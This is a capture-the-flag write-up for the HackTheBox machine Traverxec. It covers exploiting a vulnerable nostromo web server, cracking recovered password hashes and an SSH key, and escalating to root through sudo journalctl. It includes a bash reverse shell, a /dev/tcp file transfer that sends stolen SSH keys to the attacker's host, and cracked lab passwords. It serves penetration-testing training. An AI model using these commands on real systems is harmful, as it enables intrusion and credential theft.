---
render_with_liquid: false
title: HackTheBox Writeup  Traverxec
date: 2023-08-02 14:27:32 +1400
tags: [hackthebox, nmap, linux, nostromo, cve-2019-16278, outdated-software, remote-code-execution, htpasswd, hashcat, ssh2john, bash-script, sudo, shell-tty, journalctrl, gtfobin, oscp-like]
---



Traverxec is an easy Linux machine that features a Nostromo Web Server, which is vulnerable to Remote Code Execution (RCE). The Web server configuration files lead us to SSH credentials, which allow us to move laterally to the user `david`. A bash script in the user&amp;#039;s home directory reveals that the user can execute `journalctl` as root. This is exploited to spawn a `root` shell.

# Recon
---

## Nmap

```bash

# Nmap 7.94 scan initiated Wed Aug  2 14:27:32 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p- 10.10.10.165
Increasing send delay for 10.10.10.165 from 0 to 5 due to 101 out of 252 dropped probes since last increase.
Increasing send delay for 10.10.10.165 from 5 to 10 due to 11 out of 12 dropped probes since last increase.
Nmap scan report for 10.10.10.165
Host is up, received user-set (0.25s latency).
Scanned at 2023-08-02 14:27:32 CST for 1996s
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey:
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDVWo6eEhBKO19Owd6sVIAFVCJjQqSL4g16oI/DoFwUo+ubJyyIeTRagQNE91YdCrENXF2qBs2yFj2fqfRZy9iqGB09VOZt6i8oalpbmFwkBDtCdHoIAZbaZFKAl+m1UBell2v0xUhAy37Wl9BjoUU3EQBVF5QJNQqvb/mSqHsi5TAJcMtCpWKA4So3pwZcTatSu5x/RYdKzzo9fWSS6hjO4/hdJ4BM6eyKQxa29vl/ea1PvcHPY5EDTRX5RtraV9HAT7w2zIZH5W6i3BQvMGEckrrvVTZ6Ge3Gjx00ORLBdoVyqQeXQzIJ/vuDuJOH2G6E/AHDsw3n5yFNMKeCvNNL
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLpsS/IDFr0gxOgk9GkAT0G4vhnRdtvoL8iem2q8yoRCatUIib1nkp5ViHvLEgL6e3AnzUJGFLI3TFz+CInilq4=
|   256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGJ16OMR0bxc/4SAEl1yiyEUxC3i/dFH7ftnCU7+P+3s
80/tcp open  http    syn-ack ttl 63 nostromo 1.9.6
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
|_http-title: TRAVERXEC
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: nostromo 1.9.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Wed Aug  2 15:00:48 2023 -- 1 IP address (1 host up) scanned in 1996.43 seconds
```


## 80 - Static Web : TRAVERXEC


### Info

![](/assets/obsidian/081568c1701735ac8c97c507a1c6f07c.png)

### Directory

```bash
feroxbuster -t 200 -o ferox_80.txt -u 'http://10.10.10.165'
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Traverxec]
└─$ cat ferox_80.txt| grep -v 501
301      GET       14l       30w      314c http://10.10.10.165/lib => http://10.10.10.165/lib/
301      GET       14l       30w      314c http://10.10.10.165/js => http://10.10.10.165/js/
301      GET       14l       30w      314c http://10.10.10.165/css => http://10.10.10.165/css/
200      GET      400l     1177w    15674c http://10.10.10.165/
200      GET       85l      182w     2154c http://10.10.10.165/js/main.js
```

# User Flag
---

## Initial access as www-data

Port 80 seems to be the only entry point

Tried 

- brute force weak credentials for ssh
- check every source code from port 80 and enumerate directories

### RCE - nostromo  1.9.6

According to **nmap** or **whatweb** result, the http server on port 80 was hosted by `nostromo 1.9.6`

> https://www.exploit-db.com/exploits/47837

```bash
┌──(bravosec㉿fsociety)-[~/htb/Traverxec]
└─$ searchsploit -m 47837
  Exploit: nostromo 1.9.6 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47837
     Path: /usr/share/exploitdb/exploits/multiple/remote/47837.py
    Codes: CVE-2019-16278
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/kali/htb/Traverxec/47837.py
```

View the exploit code

```bash
vi 47837.py
```

Found it have a typo string on line 10 : `cve2019_16278.py`, removed it

```diff
┌──(bravosec㉿fsociety)-[~/htb/Traverxec]
└─$ diff 47837.py /usr/share/exploitdb/exploits/multiple/remote/47837.py
9a10
> cve2019_16278.py
69c70
<         print(help_menu)
---
>         print(help_menu)
\ No newline at end of file
```

This exploit needs **python2** to work

```bash
┌──(bravosec㉿fsociety)-[~/htb/Traverxec]
└─$ source ~/venv-py2/bin/activate

┌──(venv-py2)─(bravosec㉿fsociety)-[~/htb/Traverxec]
└─$ python 47837.py 10.10.10.165 80 id
...

HTTP/1.1 200 OK
Date: Wed, 02 Aug 2023 08:24:53 GMT
Server: nostromo 1.9.6
Connection: close


uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Get reverse shell

```bash
python 47837.py 10.10.10.165 80 '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.46/1111 0>&1"'
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Traverxec]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.46] from (UNKNOWN) [10.10.10.165] 35290
bash: cannot set terminal process group (457): Inappropriate ioctl for device
bash: no job control in this shell
www-data@traverxec:/usr/bin$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@traverxec:/usr/bin$ ^Z
zsh: suspended  nc -lvnp 1111

┌──(bravosec㉿fsociety)-[~/htb/Traverxec]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111
                               export TERM=xterm
www-data@traverxec:/usr/bin$
```

## From www-data to david


### Found htpasswd

Do some basic enum

```bash
www-data@traverxec:/usr/bin$ cat /etc/passwd|grep sh$
root:x:0:0:root:/root:/bin/bash
david:x:1000:1000:david,,,:/home/david:/bin/bash
```

Since i'm have `www-data`, find what I owned

```bash
www-data@traverxec:/usr/bin$ find / -user www-data 2>/dev/null|grep -vE '^/proc|^/run|^/sys|^/tmp'
/dev/pts/0
/var/nostromo/logs
/var/nostromo/logs/nhttpd.pid
www-data@traverxec:/$ cd /var/nostromo/logs
www-data@traverxec:/var/nostromo/logs$ ls -la
total 12
drwxr-xr-x 2 www-data daemon   4096 Aug  2 01:58 .
drwxr-xr-x 6 root     root     4096 Oct 25  2019 ..
-rw-r--r-- 1 www-data www-data    4 Aug  2 01:58 nhttpd.pid
www-data@traverxec:/var/nostromo/logs$ cat nhttpd.pid
460
www-data@traverxec:/var/nostromo/logs$ cd ..
www-data@traverxec:/var/nostromo$ ls -a
.  ..  conf  htdocs  icons  logs
www-data@traverxec:/var/nostromo$ cd conf
www-data@traverxec:/var/nostromo/conf$ ls
mimes  nhttpd.conf
www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf

# MAIN [MANDATORY]

servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html


# LOGS [OPTIONAL]

logpid                  logs/nhttpd.pid


# SETUID [RECOMMENDED]

user                    www-data


# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd


# ALIASES [OPTIONAL]

/icons                  /var/nostromo/icons


# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
www-data@traverxec:/var/nostromo/conf$ cat /var/nostromo/conf/.htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```

### Crack htpasswd

```bash
hashcat htpasswd /opt/wordlists/rockyou.txt --user
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Traverxec/loot]
└─$ hashcat htpasswd /opt/wordlists/rockyou.txt --user --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5) | Operating System

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4me
```


### Access hidden home directory at /home/david

Web server's home directory mappings for users will be like: `http://<SERVER>/~<USERNAME>/`

Visit `http://10.10.10.165/~david/`

![](/assets/obsidian/debd0ea7f0dad2f272cf1b88373e3e09.png)

It does exist, check at target machine's 

```bash
www-data@traverxec:/var/nostromo/conf$ cd /home
www-data@traverxec:/home$ ls -la
total 12
drwxr-xr-x  3 root  root  4096 Oct 25  2019 .
drwxr-xr-x 18 root  root  4096 Sep 16  2022 ..
drwx--x--x  5 david david 4096 Oct 25  2019 david
```

We do have permission to change directory to `/home/david`, but can't list directories and files

Check `public_www` defined in web server config

```bash
www-data@traverxec:/home$ cd david/public_www
www-data@traverxec:/home/david/public_www$ ls -la
total 16
drwxr-xr-x 3 david david 4096 Oct 25  2019 .
drwx--x--x 5 david david 4096 Oct 25  2019 ..
-rw-r--r-- 1 david david  402 Oct 25  2019 index.html
drwxr-xr-x 2 david david 4096 Oct 25  2019 protected-file-area
```

```bash
www-data@traverxec:/home/david/public_www$ cd protected-file-area/
www-data@traverxec:/home/david/public_www/protected-file-area$ ls -la
total 16
drwxr-xr-x 2 david david 4096 Oct 25  2019 .
drwxr-xr-x 3 david david 4096 Oct 25  2019 ..
-rw-r--r-- 1 david david   45 Oct 25  2019 .htaccess
-rw-r--r-- 1 david david 1915 Oct 25  2019 backup-ssh-identity-files.tgz
www-data@traverxec:/home/david/public_www/protected-file-area$ cat .htaccess
realm David's Protected File Area. Keep out!
```

### Transfer backup file

```bash
┌──(bravosec㉿fsociety)-[~/htb/Traverxec/loot]
└─$ nc -lvnp 443 > backup-ssh-identity-files.tgz
listening on [any] 443 ...
```

```bash
www-data@traverxec:/home/david/public_www/protected-file-area$ cat backup-ssh-identity-files.tgz > /dev/tcp/10.10.14.46/443
```

```bash
connect to [10.10.14.46] from (UNKNOWN) [10.10.10.165] 50664
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Traverxec/loot]
└─$ tar -zxvf backup-ssh-identity-files.tgz
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub

┌──(bravosec㉿fsociety)-[~/htb/Traverxec/loot]
└─$ cd home/david/.ssh

┌──(bravosec㉿fsociety)-[~/…/loot/home/david/.ssh]
└─$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,477EEFFBA56F9D283D349033D5D08C4F

seyeH/feG19TlUaMdvHZK/2qfy8pwwdr9sg75x4hPpJJ8YauhWorCN4LPJV+wfCG
...
VeYniFU/TGnRKDYLQH2x0ni1tBf0wKOLERY0CbGDcquzRoWjAmTN/PV2VbEKKD/w
-----END RSA PRIVATE KEY-----

┌──(bravosec㉿fsociety)-[~/…/loot/home/david/.ssh]
└─$ cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCsXrsMQc0U71GVXMQcTOYIH2ZvCwpxTxN1jOYbTutvNyYThEIjYpCVs5DKhZi2rNunI8Z+Ey/FC9bpmCiJtao0xxIbJ02c+H6q13aAFrTv61GAzi5neX4Lj2E/pIhd3JBFYRIQw97C66MO3UVqxKcnGrCvYnhJvKMw7nSRI/cXTPHAEnwU0+NW2zBKId8cRRLxGFyM49pjDZPsAVgGlfdBD380vVa9dMrJ/T13vDTZZGoDgcq9gRtD1B6NJoLHaRWH4ikRuQvLWjk3nWDDaRjw6MxmRtLk8h0MM7+IiBYc6NJvbQzpG5M5oM0FvhawQetN71KcZ4jUVxN3m+YkaqHD david@traverxec
```

Seems like the ssh private key belongs to `david`

### Crack ssh private key

```bash
┌──(bravosec㉿fsociety)-[~/…/loot/home/david/.ssh]
└─$ ssh2john id_rsa > id_rsa.hash

┌──(bravosec㉿fsociety)-[~/…/loot/home/david/.ssh]
└─$ hashcat id_rsa.hash /opt/wordlists/rockyou.txt --user --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

22931 | RSA/DSA/EC/OpenSSH Private Keys ($1, $3$) | Private Key

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

id_rsa:$sshng$1$16$477eeffba56f9d2...cf57655b10a283ff0:hunter
```

### SSH as david

```bash
┌──(bravosec㉿fsociety)-[~/…/loot/home/david/.ssh]
└─$ chmod 600 id_rsa

┌──(bravosec㉿fsociety)-[~/…/loot/home/david/.ssh]
└─$ ssh david@10.10.10.165 -i id_rsa
Enter passphrase for key 'id_rsa':
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
Last login: Wed Aug  2 08:49:56 2023 from 10.10.14.46
david@traverxec:~$ id
uid=1000(david) gid=1000(david) groups=1000(david),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
david@traverxec:~$ cat user.txt
37c99e84fa9049c2ec96421809117045
```

# Root Flag
---

## Abuse hidden sudoers rules

Tried `Nowonly4me`, `hunter` for the password, did not work

```bash
david@traverxec:~/bin$ sudo -l
[sudo] password for david:
Sorry, try again.
[sudo] password for david:
Sorry, try again.
```

```bash
david@traverxec:~$ ls -la
total 36
drwx--x--x 5 david david 4096 Oct 25  2019 .
drwxr-xr-x 3 root  root  4096 Oct 25  2019 ..
lrwxrwxrwx 1 root  root     9 Oct 25  2019 .bash_history -> /dev/null
-rw-r--r-- 1 david david  220 Oct 25  2019 .bash_logout
-rw-r--r-- 1 david david 3526 Oct 25  2019 .bashrc
drwx------ 2 david david 4096 Oct 25  2019 bin
-rw-r--r-- 1 david david  807 Oct 25  2019 .profile
drwxr-xr-x 3 david david 4096 Oct 25  2019 public_www
drwx------ 2 david david 4096 Oct 25  2019 .ssh
-r--r----- 1 root  david   33 Aug  2 01:59 user.txt
david@traverxec:~$ cd bin
david@traverxec:~/bin$ ls -la
total 16
drwx------ 2 david david 4096 Oct 25  2019 .
drwx--x--x 5 david david 4096 Oct 25  2019 ..
-r-------- 1 david david  802 Oct 25  2019 server-stats.head
-rwx------ 1 david david  363 Oct 25  2019 server-stats.sh
david@traverxec:~/bin$ cat server-stats.sh

#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

the **sudo** binary might be configured to NOPASSWD in `/etc/soders`, try run the command

```bash
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
-- Logs begin at Wed 2023-08-02 01:58:50 EDT, end at Wed 2023-08-02 09:32:36 EDT. --
Aug 02 07:48:25 traverxec nhttpd[812]: /../../../../bin/sh sent a bad cgi header
Aug 02 07:48:26 traverxec nhttpd[814]: /../../../../bin/sh sent a bad cgi header
Aug 02 08:04:13 traverxec nhttpd[833]: /../../../../bin/sh sent a bad cgi header
Aug 02 08:04:30 traverxec nhttpd[836]: /../../../../bin/bash sent a bad cgi header
Aug 02 08:05:02 traverxec nhttpd[839]: /../../../../bin/bash sent a bad cgi header
```

It worked, find `journalctl` on **gtfobin**

> https://gtfobins.github.io/gtfobins/journalctl/#sudo

`journalctl` can be abused to run commands after entering interactive mode

The sudoer rules requires david to specify `-n5`, which will not make `journalctl` enter interactive mode

Enter another **tty** shell first

```bash
david@traverxec:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

- TTY showcase
![](/assets/obsidian/f5ba71ce764922e47b68403c49736c28.png)


Execute the `journalctl` command again

```bash
david@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
```

![](/assets/obsidian/d31aca6cb34ec85b16f9c15c70319138.png)

Enter `!/bin/bash`

```bash
...
Aug 02 09:46:34 traverxec systemd[1]: Started nostromo nhttpd server.
!/bin/bash
root@traverxec:/home/david# id
uid=0(root) gid=0(root) groups=0(root)
root@traverxec:/home/david# cat /root/root.txt
9fdda1ea9c21f8d94c18e437d747511b
```

# Additional
---

## Further Enumeration as was www-data

```bash
www-data@traverxec:/usr/bin$ find / -user david 2>/dev/null|grep -vE '^/proc|^/run|^/sys|^/tmp'
<vid 2>/dev/null|grep -vE '^/proc|^/run|^/sys|^/tmp'
/home/david

www-data@traverxec:/var/nostromo/conf$ stat nhttpd.conf
  File: nhttpd.conf
  Size: 498             Blocks: 8          IO Block: 4096   regular file
Device: 801h/2049d      Inode: 10987       Links: 1
Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    2/     bin)
Access: 2023-08-02 01:58:50.697320706 -0400
Modify: 2019-10-25 15:20:39.986453020 -0400
Change: 2019-10-27 16:12:13.847028665 -0400

www-data@traverxec:/var/nostromo/conf$ find / -type f -newermt "2019-10-25 15:00" ! -newermt "2019-10-27 17:00" -ls 2>/dev/null
    16146      4 -rw-r--r--   1 root     root         2007 Oct 25  2019 /etc/rsyslog.conf
    32461      4 -rw-r-----   1 root     shadow        940 Oct 27  2019 /etc/shadow
    32990      4 -rw-r--r--   1 root     root         3397 Oct 25  2019 /etc/mailcap
    32846      4 -r--r-----   1 root     root          862 Oct 27  2019 /etc/sudoers
     8360      0 -rw-r--r--   1 root     root            0 Oct 25  2019 /etc/motd
    35497     88 -rw-r--r--   1 root     root        87664 Oct 25  2019 /var/backups/dpkg.status.1.gz
    10991      4 -rw-------   1 root     shadow        940 Oct 27  2019 /var/backups/shadow.bak
       36      4 -rw-r--r--   1 root     root          944 Oct 25  2019 /var/backups/apt.extended_states.1.gz
    11012      0 -rw-------   1 root     david           0 Oct 25  2019 /var/lib/sudo/lectured/david
    11139      8 -rw-r--r--   1 root     root         5214 Oct 25  2019 /var/lib/dpkg/info/dos2unix.list
    11023      4 -rw-r--r--   1 root     root          614 Oct 25  2019 /var/lib/dpkg/info/unzip.list
    11005      4 -rw-r--r--   1 root     bin            41 Oct 25  2019 /var/nostromo/conf/.htpasswd
    10987      4 -rw-r--r--   1 root     bin           498 Oct 25  2019 /var/nostromo/conf/nhttpd.conf
    11011      4 -rw-r--r--   1 root     root           55 Oct 25  2019 /var/nostromo/htdocs/empty.html
       32     16 -rw-r--r--   1 root     root        15674 Oct 25  2019 /var/nostromo/htdocs/index.html
    33093      4 -rw-r--r--   1 man      man           190 Oct 27  2019 /var/cache/man/uk/CACHEDIR.TAG
```